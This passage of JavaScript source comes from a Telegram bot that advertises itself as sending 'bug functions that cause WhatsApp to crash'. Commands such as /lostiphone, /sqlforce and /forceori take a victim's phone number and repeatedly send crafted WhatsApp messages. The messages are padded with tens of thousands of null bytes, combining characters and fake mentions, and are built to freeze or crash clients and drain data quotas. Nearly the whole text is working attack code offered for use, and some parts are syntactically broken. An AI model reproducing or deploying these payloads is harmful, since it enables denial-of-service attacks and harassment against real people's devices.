  for (let i = 0; i < 300; i++) {
    await BetaDelay(sock, target);
    await sleep(400);
    await DrainingQuota(sock, target);
    await sleep(400);
    await DrainingQuota(sock, target);
    await sleep(400);
    await DrainingQuota(sock, target);
    await sleep(400);
    await DrainingQuota(sock, target);
    await sleep(1000);
    await BulldoIngpis(sock, target);
    await sleep(300);
    await BulldoIngpis(sock, target);
    await sleep(300);
    await BulldoIngpis(sock, target);
    await sleep(300);
    await BulldoIngpis(sock, target);
    await sleep(300);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>空所 ┊ V O I D ☇ S T R O M 
──────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @ameliamodders, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Informasion Bot ☇  ⌟
⬡ Author¹ : @ameliamodders
⬡ Author² : @Gabrieltzyproooool
⬡ Version: 19.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

─▢ Target: ${q}
─▢ Status: Success
─▢ Type: Draining Quota
</pre>
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("lostiphone", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /lostiphone 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>空所 ┊ V O I D ☇ S T R O M 
──────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @ameliamodders, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Informasion Bot ☇  ⌟
⬡ Author¹ : @ameliamodders
⬡ Author² : @Gabrieltzyproooool
⬡ Version: 19.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

─▢ Target: ${q}
─▢ Status: Process
─▢ Type: Invisible Force Ios
</pre>
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 80; i++) {
    await ForcXIOs.js(sock, target);
    await sleep(1000);
    await ZieeInvisForceIOS(sock, target);
    await sleep(1000);
    await NewIos(sock, target)
    await sleep(200);
    await makloios(sock, target)
    await sleep(200);
    await ioss(target, true);
    await sleep(200);
    await AndroIos(target)
    await sleep(200);
    await iosCrl(target);
    await sleep(200);
    await iosOd(target);
    await sleep(200);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>空所 ┊ V O I D ☇ S T R O M 
──────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @ameliamodders, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Informasion Bot ☇  ⌟
⬡ Author¹ : @ameliamodders
⬡ Author² : @Gabrieltzyproooool
⬡ Version: 19.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

─▢ Target: ${q}
─▢ Status: Success
─▢ Type: Invisible Force Ios
</pre>
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("onehit", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /lostiphone 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>空所 ┊ V O I D ☇ S T R O M 
──────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @ameliamodders, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Informasion Bot ☇  ⌟
⬡ Author¹ : @ameliamodders
⬡ Author² : @Gabrieltzyproooool
⬡ Version: 19.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

─▢ Target: ${q}
─▢ Status: Process
─▢ Type: Invisible Force Ios
</pre>
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 1; i++) {
    await mikirKidz(sock, target);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>空所 ┊ V O I D ☇ S T R O M 
──────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @ameliamodders, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Informasion Bot ☇  ⌟
⬡ Author¹ : @ameliamodders
⬡ Author² : @Gabrieltzyproooool
⬡ Version: 19.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

─▢ Target: ${q}
─▢ Status: Success
─▢ Type: Invisible Force Ios
</pre>
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${q}` }
      ]]
    }
  });
});
bot.command("sqlforce", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /sqlforce 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>空所 ┊ V O I D ☇ S T R O M 
──────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @ameliamodders, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Informasion Bot ☇  ⌟
⬡ Author¹ : @ameliamodders
⬡ Author² : @Gabrieltzyproooool
⬡ Version: 19.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

─▢ Target: ${q}
─▢ Status: Process
─▢ Type: sqlforce
</pre>
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 1; i++) {
    await sqlinvisible(sock, target)
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>空所 ┊ V O I D ☇ S T R O M 
──────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @ameliamodders, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Informasion Bot ☇  ⌟
⬡ Author¹ : @ameliamodders
⬡ Author² : @Gabrieltzyproooool
⬡ Version: 19.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

─▢ Target: ${q}
─▢ Status: Success
─▢ Type: sqlforce
</pre>
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${q}` }
      ]]
    }
  });
});
bot.command("forceori", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /forceori 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>空所 ┊ V O I D ☇ S T R O M 
──────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @ameliamodders, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Informasion Bot ☇  ⌟
⬡ Author¹ : @ameliamodders
⬡ Author² : @Gabrieltzyproooool
⬡ Version: 19.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

─▢ Target: ${q}
─▢ Status: Process
─▢ Type: forceori
</pre>
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 1; i++) {
    await Forcenww(target);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>空所 ┊ V O I D ☇ S T R O M 
──────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @ameliamodders, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Informasion Bot ☇  ⌟
⬡ Author¹ : @ameliamodders
⬡ Author² : @Gabrieltzyproooool
⬡ Version: 19.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

─▢ Target: ${q}
─▢ Status: Success
─▢ Type: forceori
</pre>
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

async function Forcenww(target) {
        sock.relayMessage(target, {
        interactiveMessage: {
            body: {
                text: 'AMELIA KILL YOU'
            },
            header: {
                hasMediaAttachment: true,
                jpegThumbnail: o,
                contextInfo: {
                participant: target
                }
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "payment_method",
                        buttonParamsJson: "{}"
                    }
                ]
            }
        }
    }, {
    participant: { jid: target },
    additionalNodes: [
            {
                tag: 'biz',
                attrs: { native_flow_name: 'payment_method' }
            }
        ]
    });
}

async function sqlinvisible(sock, target) {
  let message = {
    interactiveMessage: {
      body: {
        text: "⎋⭑̤⟅̊༑ ▾ 𝐍͢𝐑ͮ𝐔𝚯ͮ ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯ͮ𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑‣꙱"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_method",
            buttonParamsJson: "{}"
          }
        ]
      }
    }
  };

  await sock.relayMessage(target, message, {
    messageId: null,
    participant: { jid: target },
    userJid: target
  });
}

async function ForcXIOs.js(sock, target) {
   try {
      const zieeMsg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage: {
                  degreesLatitude: 21.1266,
                  degreesLongitude: -11.8199,
                  name: "Z1ee - Tryhards 驴?" + "\u0000".repeat(70000) + "饝噦饝喌饝喆饝喛".repeat(60000),
                  url: "https://github.com/Urz1ee",
                  address: "Z1ee - Tryhards 驴?" + "饝喛".repeat(5000),
                  jpegThumbnail: null,
                  contextInfo: {
                     externalAdReply: {
                        quotedAd: {
                           advertiserName: "饝噦饝喌饝喆饝喛".repeat(60000),
                           mediaType: "IMAGE",
                           jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                           caption: "@Urz1ee" + "饝噦饝喌饝喆饝喛".repeat(70000)
                        },
                        placeholderKey: {
                           remoteJid: "0s.whatsapp.net",
                           fromMe: false,
                           id: "ABCDEF1234567890"
                        }
                     }
                  }
               },
               extendedTextMessage: {
                  text: "Amelia Modders 驴?",
                  matchedText: "Z1ee - Tryhards 驴?",
                  description: "Z1ee - Tryhards 驴?".repeat(15000),
                  title: "Z1ee - Tryhards 驴?" + "\u200B".repeat(15000),
                  previewType: "NONE",
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                  mediaKeyTimestamp: Date.now()
               }
            }
         }
      }, {});

      await sock.relayMessage("status@broadcast", zieeMsg.message, {
         messageId: zieeMsg.key?.id || Math.random().toString(36).slice(2),
         statusJidList: [target],
         additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
               tag: "mentioned_users",
               attrs: {},
               content: [{ tag: "to", attrs: { jid: target } }]
            }]
         }]
      });

   } catch (err) {
      console.error(err);
   }
}

async function BetaDelay(sock, target) {
    let biji = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: " - are you listening? ",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_message",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );
    
    let biji2 = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: " - who are you ? ",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );    

    await sock.relayMessage(
        "status@broadcast",
        biji.message,
        {
            messageId: biji.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );
    
    await sock.relayMessage(
        "status@broadcast",
        biji2.message,
        {
            messageId: biji2.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );    
}

async function iosOd(target) {
  let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              orderMessage: {
                orderId: "0",
                itemCount: 69,
                status: "DECLINED",
                surface: "BUFFERS",
                orderDescription: "🩸⃟ ༚ 𝒔⃰ͯཀ͜͡🦠-‣" + "𖣂".repeat(15000),
                message: "🩸⃟ ༚ 𝒔⃰ͯཀ͜͡🦠-‣\n\n" + "𖣂".repeat(15000),
                orderTitle: "🩸⃟ ༚ 𝒔⃰ͯཀ͜͡🦠-‣",
                token: "92298382919191",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAAD5oCZ7CkelJ4cb4AADp5uopG9C3HbQxABpS1w2gwi2QABaaSbbckE1mAAAC2gZQAH/xAAkEAACAgEDBAIDAAAAAAAAAAABAgADEQQgIRITMUEQcRQjUf/aAAgBAQABPwD5AJiaVnGY2lsAhBBwdqgExHoWVsjABDLbUqGG8y2xXJIG78Wzs94+Jp2IeXuXckmXadK6K3DctufV2PStPoTSVFmyZqKirEwsxABPAjKCgIPjZhQOYM+hFNx4BM6bGxk+Z0QHAOwjqXMRlAlVqB+f5O6vbA9hoz5OQONqsVMPHI8RShEwn7PriE7gcQjHImTMYG9Wx9Q9oYIhOT8//8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
                messageVersion: 1,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "🩸⃟ ༚ 𝒔⃰ͯཀ͜͡🦠-‣".repeat(15000),
            },
            nativeFlowMessage: {
              name: "galaxy_message",
              messageParamsJson: "{\"icon\":\"REVIEW\",\"flow_cta\":\"\\u0000\",\"flow_message_version\":\"3\"}",
            },
          },
        },
      },
    }), {});
    
  await sheesh.relayMessage("status@broadcast", etc.message, {
    messageId: etc.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
              },
            ],
          },
        ],
      },
    ],
  });
}

async function iosCrl(target) {
   let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
     message: {
      interactiveMessage: {
       header: {
        title: "- sheesh",
        locationMessage: {
          degreesLatitude: -9.09999262999,
          degreesLongitude: 199.99963118999,
          jpegThumbnail: null,
          name: "🩸⃟ ༚ 𝒔⃰ͯཀ͜͡🦠-‣" + "\u0000".repeat(15000),
          address: "🩸⃟ ༚ 𝒔⃰ͯཀ͜͡🦠-‣" + "\u0000".repeat(5000),
          url: `https://xnxx.${"\u0000".repeat(25000)}.com`,
        },
        hasMediaAttachment: true
       },
       body: {
        text: "\u0000".repeat(10000)
       },
       nativeFlowMessage: {
         name: "call_permission_request",
        messageParamsJson: " { } "
       },
       carouselMessage: {}
      }
     }
    }
   }), {});

  await sock.relayMessage("status@broadcast", etc.message, {
    messageId: etc.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
              },
            ],
          },
        ],
      },
    ],
  });
};

async function AndroIos(target) {
  const msg = {
    message: {
      locationMessage: {
        degreesLatitude: 21.1266,
        degreesLongitude: -11.8199,
        name: "🩸⃟ ༚ 𝒔⃰ͯཀ͜͡🦠-‣" + "\u0000".repeat(70000) + "𑇂𑆵𑆴𑆿".repeat(60000),
        url: "https://github.com/" +"𑇂𑆵𑆴𑆿".repeat(10000),
        contextInfo: {
          externalAdReply: {
            quotedAd: {
              advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
              mediaType: "IMAGE",
              jpegThumbnail: "",
              caption: "🩸⃟ ༚ 𝒔⃰ͯཀ͜͡🦠-‣" + "𑇂𑆵𑆴𑆿".repeat(10000)
            },
            placeholderKey: {
              remoteJid: "0s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target }
              }
            ]
          }
        ]
      }
    ]
  });
}

async function NativeflowUI(sock, target) {
const zieeMsg = {
    interactiveMessage: {
        body: { 
            text: "𝗔𝗠𝗘𝗟𝗜𝗔 𝗞𝗜𝗟𝗟 𝗬𝗢𝗨👿" + "ꦾ".repeat(80000) + "~@1~".repeat(40000)
        },
        footer: { 
            text: "https://t.me/ameliamodders" + "\u200B".repeat(50000) 
        },
        header: {
            title: "𝗔𝗠𝗘𝗟𝗜𝗔 𝗞𝗜𝗟𝗟 𝗬𝗢𝗨👿" + "ꦾ".repeat(80000) + "~@1~".repeat(40000),
            subtitle: "\u200B",
            hasMediaAttachment: true,
            locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0,
                name: "zie",
                address: ""
            }
        },
        nativeFlowMessage: {
            buttons: [
                { 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "X", id: "zie1" }) 
                },
                { 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "X", id: "zie2" }) 
                },
                { 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "X", id: "zie3" }) 
                },
                { 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "X", id: "zie4" }) 
                },
                { 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "X", id: "zie5" }) 
                }
            ]
        }
    }
};

await sock.relayMessage(target, zieeMsg, { messageId: null });
}

async function ForcexUi(sock, target) {
  const zieeMsg = [
    "0@s.whatsapp.net",
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 5000 }, () =>
      "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
    ),
  ];

  for (let i = 0; i < 75; i++) {
    const mediaFlood = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "𝗔𝗠𝗘𝗟𝗜𝗔 𝗞𝗜𝗟𝗟 𝗬𝗢𝗨👿",
            },
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: zieeMsg,
              ephemeralSettingTimestamp: 9741,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING",
              },
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({ status: true }),
                },
              ],
              messageParamsJson: "{{".repeat(15000),
            },
          },
          extendedTextMessage: {
            text: "ꦾ".repeat(25000) + "@1".repeat(25000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation:
                  "Z1ee - Tryhards ¿?" +
                  "ꦾ࣯࣯".repeat(60000) +
                  "@1".repeat(30000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
      },
    };

    try {
      const msg = generateWAMessageFromContent(target, mediaFlood, {});
      await sock.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
      });
    } catch (err) {
    }
  }
}

async function ZieeInvisForceIOS(sock, target) {
  const msg = {
    message: {
      locationMessage: {
        degreesLatitude: 21.1266,
        degreesLongitude: -11.8199,
        name: "𝗔𝗠𝗘𝗟𝗜𝗔 𝗞𝗜𝗟𝗟 𝗬𝗢𝗨👿" + "\u0000".repeat(70000) + "𑇂𑆵𑆴𑆿".repeat(60000),
        url: "https://github.com/urz1ee",
        contextInfo: {
          externalAdReply: {
            quotedAd: {
              advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
              caption: "@Urz1ee" + "𑇂𑆵𑆴𑆿".repeat(70000)
            },
            placeholderKey: {
              remoteJid: "0s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key?.id || Math.random().toString(36).slice(2),
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target }
              }
            ]
          }
        ]
      }
    ]
  });
}

async function forceSystem(sock, target) {
  await sock.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name:
              "\u2060" +
              "ꦽ".repeat(45000),
            address: "",
            url:
              "𝗔𝗠𝗘𝗟𝗜𝗔 𝗞𝗜𝗟𝗟 𝗬𝗢𝗨👿" +
              "¿?".repeat(100000) +
              ".com",
            contextInfo: {
              externalAdReply: {
                quotedAd: {
                  advertiserName: "¿?".repeat(10000),
                  mediaType: "IMAGE",
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                  caption: "",
                },
                placeholderKey: {
                  remoteJid: "0@s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890",
                },
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000,
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid:
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net",
                  creatorName: "Bot",
                },
              },
            },
          },
        },
      },
    },
    { participant: { jid: target } }
  );
}

async function FloodXCrlUI(target) {
  const zieeMsg = [
    { name: "single_select", buttonParamsJson: "" }
  ];

  for (let i = 0; i < 10; i++) {
    zieeMsg.push(
      { name: "cta_call",    buttonParamsJson: JSON.stringify({ status: true }) },
      { name: "cta_copy",    buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
      { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) }
    );
  }

  const x = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
           participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
           stanzaId: "123",
           quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot"
              }
            }
          },
          carouselMessage: {
            messageVersion: 1,
            cards: [
              {
                header: {
                  title: "ꦾ".repeat(77777),
                  hasMediaAttachment: true,
                  imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
                fileLength: "9999999999999",
                height: 9999,
                width: 9999,
                mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
                fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
                directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1755254367",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAQIAEBEgEhNR/9oACAEDAQE/AKOiw7YoRELToaGwSM4M5t6b/9k=",
                  },
                },
                body: { text: "Z1ee - Tryhards ¿?" + "\u0000".repeat(5000) },
                footer: { text: "Z1ee - Tryhards ¿?" + "\u0000".repeat(5000) },
                nativeFlowMessage: {
                  buttons: zieeMsg,
                  messageParamsJson: "[{".repeat(10000)
                }
              }
            ]
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, proto.Message.fromObject(x), { userJid: target });
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

async function DrainingQuota(sock, target) {
  try {
    const zieeMsg = {
      viewOnceMessage: {
        message: {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title:
                    "᬴᬴᬴".repeat(15000) +
                    "꧔꧈".repeat(15000) +
                    "ꦽ".repeat(20000),
                  hasMediaAttachment: false,
                  locationMessage: {
                    degreesLatitude: 992.999999,
                    degreesLongitude: -932.8889989,
                    name:
                      "᬴᬴᬴".repeat(15000) +
                      "꧔꧈".repeat(15000) +
                      "ꦽ".repeat(20000),
                    address:
                      "᬴᬴᬴".repeat(15000) +
                      "꧔꧈".repeat(15000) +
                      "ꦽ".repeat(20000),
                  },
                },
                body: {
                  text: "Z1ee - Tryhards ¿?" + "꧔꧈".repeat(2000),
                },
                contextInfo: {
                  mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1900 }, () =>
                      "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
